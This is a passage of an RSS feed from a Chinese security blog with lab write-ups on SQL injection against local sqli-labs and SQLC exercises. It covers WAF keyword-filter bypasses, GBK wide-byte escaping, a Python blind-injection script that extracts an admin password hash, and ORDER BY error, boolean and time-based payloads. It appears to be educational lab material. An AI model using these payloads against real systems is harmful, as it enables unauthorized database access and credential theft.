&lt;h3 id=&#34;绕过方式一-1&#34;&gt;&lt;a href=&#34;#绕过方式一-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式一&#34;&gt;&lt;/a&gt;绕过方式一&lt;/h3&gt;&lt;p&gt;大小写随机替换（可能需要多尝试几次）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0Union%a0seLEct%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;seLEct�1,2,&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0UNion%a0seLEct%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; UNion sEleCT 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0UNion%a0sEleCT%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002150723525.png&#34; alt=&#34;image-20221002150723525&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过方式二-1&#34;&gt;&lt;a href=&#34;#绕过方式二-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式二&#34;&gt;&lt;/a&gt;绕过方式二&lt;/h3&gt;&lt;p&gt;使用内联注释绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; /*!union*/ /*!select*/ 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0/*!union*/%a0/*!select*/%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式三&#34;&gt;&lt;a href=&#34;#绕过方式三&#34; class=&#34;headerlink&#34; title=&#34;绕过方式三&#34;&gt;&lt;/a&gt;绕过方式三&lt;/h3&gt;&lt;p&gt;使用双写、三写绕过（和绕过方式一一样，这个也需要多次尝试）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#在union任意位置中插入union&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union---&amp;gt;un union ion (双写)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#在select任意位置中插入select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select ---&amp;gt;se select lect(双写) ----&amp;gt; sese select lectlect(三写)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0ununionion%a0seseselectlectlect%a01,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002170323197.png&#34; alt=&#34;image-20221002170323197&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;宽字节注入&#34;&gt;&lt;a href=&#34;#宽字节注入&#34; class=&#34;headerlink&#34; title=&#34;宽字节注入&#34;&gt;&lt;/a&gt;宽字节注入&lt;/h2&gt;&lt;p&gt;MySQL中，当数据库编码是GBK的时候，编码可以表示中文，两个字符代表一个汉字。&lt;/p&gt;
&lt;p&gt;编码范围是：8140-FEFE&lt;/p&gt;
&lt;p&gt;其中，GB2312的编码范围是：B0A1-F7FE&lt;/p&gt;
&lt;p&gt;Less-32为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1\&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The Query String you input in Hex becomes : 315c27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1\&amp;#x27;\&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;The Query String you input in Hex becomes : 315c275c22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以发现，我们的单引号在服务器后台被&lt;code&gt;\号&lt;/code&gt;转义了。&lt;/p&gt;
&lt;h3 id=&#34;绕过方式-2&#34;&gt;&lt;a href=&#34;#绕过方式-2&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;观察反斜杠的hex值发现是5c，接下来我们根据GBK编码来做单引号逃逸。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;815C&lt;/code&gt;在GBK编码范围&lt;code&gt;8140-FEFE&lt;/code&gt;中，因此我们在单引号前加一个%81，令其与后台的反斜杠组成双字节被解析，从而释放出我们的单引号。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%81&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1�\&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;同理，在GBK2312里行得通吗？答案是肯定的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;B15C&lt;/code&gt;在GB2312的编码范围&lt;code&gt;B0A1-F7FE&lt;/code&gt;中，那么：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Hint: The Query String you input is escaped as : 1�\&amp;#x27; #&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此就可以：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; order by 3%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=1%B1&amp;#x27; order by 4%23-----报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-32/?id=-1%B1&amp;#x27; union select 1,2,version()%23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:5.1.73-community&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;过滤函数绕过&#34;&gt;&lt;a href=&#34;#过滤函数绕过&#34; class=&#34;headerlink&#34; title=&#34;过滤函数绕过&#34;&gt;&lt;/a&gt;过滤函数绕过&lt;/h2&gt;&lt;p&gt;以SQLC-sql9为例&lt;/p&gt;
&lt;p&gt;输入admin、admin结果报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173314221.png&#34; alt=&#34;image-20221002173314221&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接上BurpSuit，抓包送入Repeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173445571.png&#34; alt=&#34;image-20221002173445571&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入单引号，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=admin&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002173656791.png&#34; alt=&#34;image-20221002173656791&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们直接送入Intruder进行特殊字符爆破，看看都过滤了哪些字符&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002174151275.png&#34; alt=&#34;image-20221002174151275&#34;&gt;&lt;/p&gt;
&lt;p&gt;将特殊字符load进来&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002174237643.png&#34; alt=&#34;image-20221002174237643&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到过滤了空格，逗号等字符【由于环境不一样可能每个人的结果不同，因此不贴图，按照没有空格和逗号展开绕过】&lt;/p&gt;
&lt;p&gt;既然没有空格，我们可以使用&lt;code&gt;小括号&lt;/code&gt;或者&lt;code&gt;%a0&lt;/code&gt;代替，这里选择&lt;code&gt;小括号&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;既然没有逗号，那么很多函数我们就用不了了，比如&lt;code&gt;substr&lt;/code&gt;、&lt;code&gt;extractvalue&lt;/code&gt;等等。&lt;/p&gt;
&lt;p&gt;但是，substr还有个特性就是substr(str from n) 表示&lt;strong&gt;从第n位到结尾截取字符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OK，空格和逗号的问题都解决了。&lt;strong&gt;剩下就是搞定注入点&lt;/strong&gt;！！！！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002230320006.png&#34; alt=&#34;image-20221002230320006&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们看到&lt;code&gt;返回包里有个Hint&lt;/code&gt;，由于格式是&lt;code&gt;大小写&lt;/code&gt;+&lt;code&gt;数字&lt;/code&gt;+&lt;code&gt;==&lt;/code&gt;，我们解码&lt;code&gt;Base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002225334319.png&#34; alt=&#34;image-20221002225334319&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$query=&amp;quot;SELECT * FROM admin WHERE uname=&amp;#x27;&amp;quot;.$uname.&amp;quot;&amp;#x27;&amp;quot;;if ($row[&amp;#x27;passwd&amp;#x27;]===$passwd)&amp;#123;$_SESSION[&amp;#x27;flag&amp;#x27;] = 1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式-3&#34;&gt;&lt;a href=&#34;#绕过方式-3&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;也就是说，&lt;strong&gt;uname是用单引号包裹&lt;/strong&gt;，所以我们可以用&lt;strong&gt;单引号去闭合&lt;/strong&gt;——&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;&amp;#39; = 1 = &amp;#39;&lt;/code&gt;绕过：因为&lt;code&gt;uname=&amp;#39;&amp;#39; = 1&lt;/code&gt;为假，&lt;code&gt;假 = &amp;#39;&amp;#39;&lt;/code&gt;为真&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#原理核心，和 &amp;#x27; or 1 or &amp;#x27; 异曲同工&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=&amp;#x27;= (1) =&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#那么就可以有如下注入点：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uname=&amp;#x27;= (select(1)from(admin)where(length(passwd)=32)) =&amp;#x27;&amp;amp;passwd=admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002221112034.png&#34; alt=&#34;image-20221002221112034&#34;&gt;&lt;/p&gt;
&lt;p&gt;确定了长度，尝试考虑使用脚本爆破&lt;/p&gt;
&lt;p&gt;关键核心语句为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=  &amp;#x27;= (select(1)from(admin)where(substr((passwd)from(32))=&amp;#x27;f&amp;#x27;)) =&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#其中，32需要遍历，&amp;#x27;f&amp;#x27;也需要遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#注意，由于使用了substr + from的方式，因此需要&amp;quot;从后向前&amp;quot;盲推字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;附上脚本：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：post请求中，如果参数是”uname=xxxx &amp;amp; passwd=yyyy”这样的，我们需要在python脚本中建立一个字典去匹配。&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;#x27;password error!!@_@&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-9/login.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;uname&amp;quot;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;passwd&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	temp = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;#flag:c12366feb7373bf6d869ab7d581215cf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#first reverse cf-&amp;gt;fc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp + j   &lt;span class=&#34;comment&#34;&gt;#fcg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = temp[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#second reverse gcf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload[&lt;span class=&#34;string&#34;&gt;&amp;#x27;uname&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;= (select(1)from(admin)where(substr((passwd)from(&amp;#123;&amp;#125;))=&amp;#x27;&amp;#123;&amp;#125;&amp;#x27;)) =&amp;#x27;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;((&lt;span class=&#34;number&#34;&gt;33&lt;/span&gt;-i),temp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload[&lt;span class=&#34;string&#34;&gt;&amp;#x27;passwd&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#print(payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			response = requests.post(url, data = payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#print(response.text)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				flag = temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;++++&amp;quot;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;#if not found&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;the flag is:&amp;quot;&lt;/span&gt;,flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_flag()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;格式为&lt;code&gt;小写&lt;/code&gt;+&lt;code&gt;数字&lt;/code&gt;，属于&lt;code&gt;md5&lt;/code&gt;加密格式&lt;/p&gt;
&lt;p&gt;那么就有www.cmd5.com&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002231016796.png&#34; alt=&#34;image-20221002231016796&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</guid>
            <title>OrderBy注入</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 12:59:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;有趣的Order-by注入&#34;&gt;&lt;a href=&#34;#有趣的Order-by注入&#34; class=&#34;headerlink&#34; title=&#34;有趣的Order by注入&#34;&gt;&lt;/a&gt;有趣的Order by注入&lt;/h1&gt;&lt;p&gt;下面介绍几个从ThreeZh1师傅那里学到的几个有趣的SQL注入&lt;/p&gt;
&lt;h2 id=&#34;常规Order-by注入&#34;&gt;&lt;a href=&#34;#常规Order-by注入&#34; class=&#34;headerlink&#34; title=&#34;常规Order by注入&#34;&gt;&lt;/a&gt;常规Order by注入&lt;/h2&gt;&lt;p&gt;先来看一下Order by注入的原理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT username, password FROM users order by 1 asc;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是一个常见的order by使用语句，order by后面的数字1是第1个列的意思(&lt;strong&gt;也可以指定列名&lt;/strong&gt;)，&lt;code&gt;asc&lt;/code&gt;/ &lt;code&gt;desc&lt;/code&gt;指定是升序还是降序。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：在order by后面的不会根据计算的结果来排序。&lt;/p&gt;
&lt;p&gt;这里有以下几种方式来进行测试：&lt;/p&gt;
&lt;h3 id=&#34;order-by-报错注入&#34;&gt;&lt;a href=&#34;#order-by-报错注入&#34; class=&#34;headerlink&#34; title=&#34;order by + 报错注入&#34;&gt;&lt;/a&gt;order by + 报错注入&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;order-by-布尔盲注&#34;&gt;&lt;a href=&#34;#order-by-布尔盲注&#34; class=&#34;headerlink&#34; title=&#34;order by  + 布尔盲注&#34;&gt;&lt;/a&gt;order by  + 布尔盲注&lt;/h3&gt;&lt;p&gt;rand()会返回一个0和1之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。&lt;/p&gt;
&lt;p&gt;这里就可以用mid（也就是substr函数）来构造布尔盲注的方式来进行注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by rand(mid(version(),1,1)=5)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;order-by-gt-0的数-and-时间盲注方式&#34;&gt;&lt;a href=&#34;#order-by-gt-0的数-and-时间盲注方式&#34; class=&#34;headerlink&#34; title=&#34;order by + (&amp;gt;0的数) +and+时间盲注方式&#34;&gt;&lt;/a&gt;order by + (&amp;gt;0的数) +and+时间盲注方式&lt;/h3&gt;&lt;p&gt;在order by后面的不会根据计算的结果来排序，但是计算还是会运行。&lt;/p&gt;
&lt;p&gt;也就是，当我们的payload有延迟命令的时候，页面还是会延迟的。&lt;/p&gt;
&lt;p&gt;使用and连接时间盲注payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里用&lt;code&gt;sqllib-Less46&lt;/code&gt;作为一个学习的例子：&lt;/p&gt;
&lt;p&gt;它的源代码为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$id=$_GET[&amp;#x27;sort&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT * FROM users ORDER BY $id&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115154304.png&#34; alt=&#34;image-20221002115154304&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么可以&lt;code&gt;将这个1替换成查询语句&lt;/code&gt;，因为&lt;code&gt;查询成功&lt;/code&gt;的结果就是&lt;code&gt;返回1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：如果对上述这一句有疑问，请看下图&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = (select 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
